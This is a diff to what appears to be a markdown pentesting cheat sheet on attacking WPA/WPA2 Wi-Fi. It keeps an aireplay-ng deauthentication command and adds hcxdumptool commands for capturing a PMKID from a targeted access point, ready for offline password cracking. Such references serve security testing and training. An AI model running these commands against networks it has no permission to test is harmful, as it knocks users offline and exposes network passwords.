@@ -33,18 +33,6 @@ PTK = PRF(PMK + ANonce + SNonce + AP_MAC + STA_MAC)
 Encryption (CCMP/TKIP)
 ```
 
-### Reconnaissance
-
-```bash
-# Scan all networks
-airodump-ng $interface
-
-# Target specific AP
-airodump-ng -c $channel --bssid $bssid -w capture $interface
-```
-
-Look for `WPA`/`WPA2` + `PSK` in airodump-ng output.
-
 ## Cracking MIC (4-Way Handshake)
 
 ### Capture Handshake
@@ -52,14 +40,7 @@ Look for `WPA`/`WPA2` + `PSK` in airodump-ng output.
 ```bash
 # Deauth client to force reconnection
 aireplay-ng -0 5 -a $bssid -c $client_mac $interface
-
-# Monitor for handshake capture
-airodump-ng -c $channel --bssid $bssid -w handshake $interface
 ```
-
-::: tip Handshake Confirmation
-Airodump-ng shows WPA handshake: $bssid in the top right when captured.
-:::
 
 ### Crack PSK
 
@@ -98,19 +79,47 @@ pyrit -r handshake-01.cap analyze
 
 :::
 
+::: details Packages Requirement
+
+- [hcxpcapngtool (github)](https://github.com/ZerBea/hcxtools)
+
+```bash
+sudo apt install hcxtool hcxdumptool
+```
+
+:::
+
 ### Capture PMKID
 
 ```bash
 # Using hcxdumptool (modern method)
-hcxdumptool -i $interface -o capture.pcapng --enable_status=1
+hcxdumptool -i $interface -w capture.pcapng --rds=1
 
 # Let it run for 1-2 minutes, then stop (Ctrl+C)
 ```
 
+::: details hcxdumptool advanced
+
+```bash
+# Show details about interface
+hcxdumptool -I $interface
+
+# a = 2.4GHz, b = 5GHz, c = 6GHz, d = 60Ghz
+sudo hcxdumptool -i $interface -c 10a -w capture.pcapng --rds=1 # Channel 10 on 2.4GHz
+```
+
+```bash
+# Scan Specific BSSID
+sudo hcxdumptool -i $interface --rcascan=p --rds=3 # Find target
+echo "$bssid" | tr -d ':' | xargs -I {} sudo hcxdumptool --bpfc="wlan addr3 {}" > cible.bpf # Create BPF
+sudo hcxdumptool -i $interface -c ${channel}a -w capture.pcapng --bpf=cible.bpf # Capture
+```
+
+:::
+
 ### Extract Hash
 
 - [hcxpcapngtool (cap2hash) online](https://hashcat.net/cap2hashcat/index.pl)
-- [hcxpcapngtool (github)](https://github.com/ZerBea/hcxtools)
 
 ```bash
 # Convert to hashcat format
